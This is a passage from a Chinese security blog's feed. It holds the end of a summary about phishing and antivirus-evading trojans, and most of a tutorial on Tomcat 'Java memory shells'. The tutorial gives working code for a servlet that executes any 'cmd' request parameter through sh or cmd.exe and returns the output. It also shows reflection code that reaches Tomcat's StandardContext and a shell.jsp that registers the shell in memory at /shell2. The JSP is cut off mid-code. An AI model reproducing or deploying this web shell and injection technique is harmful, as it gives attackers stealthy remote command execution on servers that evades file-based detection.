    <summary type="html">&lt;p&gt;&lt;code&gt;邮箱钓鱼&lt;/code&gt;是一种常见的网络攻击手段,它利用伪造的电子邮件来诱导目标用户点击恶意链接或附件,从而窃取敏感信息或执行恶意代码。在进行网络攻击的时候非常常见,毕竟资产最薄弱的部分依旧还是人。&lt;/p&gt;
&lt;h1 id=&quot;制作免杀马&quot;&gt;制作免杀马&lt;/h1&gt;
&lt;p</summary>
      
    
    
    
    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="社工" scheme="http://example.com/tags/%E7%A4%BE%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>初识JAVA内存马</title>
    <link href="http://example.com/post/%E5%88%9D%E8%AF%86JAVA%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/post/%E5%88%9D%E8%AF%86JAVA%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2023-05-02T05:26:02.000Z</published>
    <updated>2023-06-14T11:51:08.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍">介绍</h1><p><code>Java内存马（Java Memory Shell）</code>是一种利用Java虚拟机（JVM）中的内存对象和反射技术来执行恶意代码的攻击手段。</p><p>与传统木马相比，Java内存马具有以下几个优势：</p><ol><li>隐藏性更强：Java内存马不需要在受害者主机上创建任何文件，因此可以极大地减少被检测到的风险。它们完全存在于JVM内存中，很难通过常规的病毒扫描程序或防火墙来检测和拦截。</li><li>反应速度更快：Java内存马直接利用JVM中已经加载的Java类和对象，在攻击者成功上传恶意代码后即可立即执行，反应速度更快。</li><li>跨平台支持更好：由于JVM是跨平台的，因此Java内存马可以在各种操作系统上运行，包括Windows、Linux、macOS等。</li></ol><p>内存马包括很多类型，这里以tomcat内存马作为学习</p><h1 id="环境准备">环境准备</h1><p>在idea中首先创建一个JavaWeb项目</p><p><img src="image-20230502133201598.png" alt="image-20230502133201598"></p><p>勾上Servlet</p><p><img src="image-20230502133141164.png" alt="image-20230502133141164"></p><p>然后就完成了一个web项目的创建</p><p>我们可以看到idea为我们新建了一个HelloServlet作为例子，同时这里是通过注释的方式来连接url与对应的Servlet的</p><p><img src="image-20230502135042167.png" alt="image-20230502135042167"></p><p>为了方便学习，我们将利用web.xml的方式修改url与Servlet间的映射关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello-servlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>能正常打开页面则配置成功</p><p><img src="image-20230502135720407.png" alt="image-20230502135720407"></p><p>接下来我们就来写一个Servlet内存马</p><h1 id="Servlet内存马">Servlet内存马</h1><p>由于我们要分析tomcat的源码，所以要先导入tomcat的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在正式开始之前我们应该先了解 Java web三大件和Tomcat的架构设计</p><p>可以参考：<a href="https://www.freebuf.com/articles/web/274466.html">一文看懂内存马</a>和<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat源码初识一 Tomcat整理流程图</a></p><p>Servlet内存马实际上就是注册一个新的Servlet来执行我们的任意命令</p><p>我们先按照一个正常的逻辑来理解一下我们要干什么</p><p>首先新建一个ShellServlet接收前端发来的cmd命令并回显</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 从HTTP请求中获取名为&quot;cmd&quot;的参数，该参数包含要执行的操作系统命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">// 检查操作系统类型以确定要使用的命令行解释器（Windows或Linux）</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据操作系统类型创建要执行的命令</span></span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="comment">// 执行命令并将输出写入到字符串变量中</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 将命令执行结果发送回HTTP响应</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将这个ShellServlet注册进tomcat，也就是在web.xml中写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Getshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.servlet.ShellServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>Getshell<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/shell<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时访问/shell并带上cmd参数就可以实现命令执行了</p><p><img src="image-20230502142348265.png" alt="image-20230502142348265"></p><p>可见要实现以上功能一共分为两步：</p><p>​<code>1.写一个Servlet马</code></p><p>​<code>2.将这个Servlet马注册进tomcat中</code></p><p>我们先写一个Servlet马，创建一个shell.jsp（是的，还是得上传一个jsp才能弄内存马），定义一个<code>Shell2Servlet</code>并复制之前的ShellServlet的内容</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell2Servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">        isLinux = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">      out.println(output);</span><br><span class="line">      out.flush();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>第一步比较简单，而要实现第二步，我们就得知道tomcat中Servlet的注册流程，也就是要明白tomcat是如何解析web.xml的</p><p>从<a href="https://blog.csdn.net/u010883443/article/details/107463782">Tomcat源码初识一 Tomcat整理流程图</a>这个图中我们可以看到对web.xml的解析主要是通过<code>org.apache.catalina.startup.ContextConfig#configureContext</code>方法进行的</p><p><img src="image-20230502153238822.png" alt="image-20230502153238822"></p><p>在web.xml中的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.servlet.HelloServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应configureContext方法中的以下内容（约在1316行开始，看起来很长，实际上重要的只有加中文注释的那几行）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();<span class="comment">//先创建一个wrapper</span></span><br><span class="line">    <span class="comment">// Description is ignored</span></span><br><span class="line">    <span class="comment">// Display name is ignored</span></span><br><span class="line">    <span class="comment">// Icons are ignored</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setName(servlet.getServletName());<span class="comment">//获取Servlet名放入到wrapper中</span></span><br><span class="line">    Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">    <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">        wrapper.addSecurityReference(</span><br><span class="line">                roleRef.getName(), roleRef.getLink());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());<span class="comment">//获取Servlet全类名放到wrapper中</span></span><br><span class="line">    <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">    <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (multipartdef.getMaxFileSize() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                multipartdef.getMaxRequestSize()!= <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                multipartdef.getFileSizeThreshold() != <span class="literal">null</span>) &#123;</span><br><span class="line">            wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                    multipartdef.getLocation(),</span><br><span class="line">                    Long.parseLong(multipartdef.getMaxFileSize()),</span><br><span class="line">                    Long.parseLong(multipartdef.getMaxRequestSize()),</span><br><span class="line">                    Integer.parseInt(</span><br><span class="line">                            multipartdef.getFileSizeThreshold())));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                    multipartdef.getLocation()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">        wrapper.setAsyncSupported(</span><br><span class="line">                servlet.getAsyncSupported().booleanValue());</span><br><span class="line">    &#125;</span><br><span class="line">    wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">    context.addChild(wrapper);<span class="comment">//这里将wrapper放到context里</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而web.xml中的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/hello-servlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对应configureContext方法中的以下内容（约在1365行开始）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">        webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">    context.addServletMapping(entry.getKey(), entry.getValue());<span class="comment">//把url路径和servlet名相关联</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：这里注册完了以后HelloServlet还没有实例化，只有在访问相关页面之后才会实例化</p></blockquote><p>那我们要想实现注册就只需要将封装了Servlet的wrapper放到content中，而这个content实际上是<code>StandardContext</code>类，所以我们要先获取<code>StandardContext</code></p><p>那如何获取呢？</p><p><code>StandardContext</code>实际上在<code>ServletContext</code>里，<code>ServletContext</code>可以从<code>request</code>中获取，如下图所示</p><p><img src="image-20230502155746017.png" alt="image-20230502155746017"></p><p>可见<code>servletContext</code>包含<code>applicationContext</code>，<code>applicationContext</code>包含<code>standardContext</code>,所以获取<code>standardContext</code>的代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<span class="comment">//通过反射获取applicationContext</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<span class="comment">//通过反射获取standardContext</span></span><br></pre></td></tr></table></figure><p>获取到<code>standardContext</code>后，接下来只需要将wrapper放到<code>standardContext</code>里面就完成注册了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();<span class="comment">//创建wrapper</span></span><br><span class="line">wrapper.setName(<span class="string">&quot;Shell2Servlet&quot;</span>);<span class="comment">//将Servlet名放到wrapper</span></span><br><span class="line">wrapper.setServletClass(Shell2Servlet.class.getName());<span class="comment">//将Servlet名放到wrapper</span></span><br><span class="line"></span><br><span class="line">wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">Shell2Servlet</span>());<span class="comment">//实例化Shell2Servlet</span></span><br><span class="line"></span><br><span class="line">context.addChild(wrapper);<span class="comment">//将wrapper放到standardContext里</span></span><br><span class="line">context.addServletMapping(<span class="string">&quot;/shell2&quot;</span>, <span class="string">&quot;Shell2Servlet&quot;</span>);<span class="comment">//映射url地址</span></span><br></pre></td></tr></table></figure><p>那么完整的shell.jsp如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell2Servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">        isLinux = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, 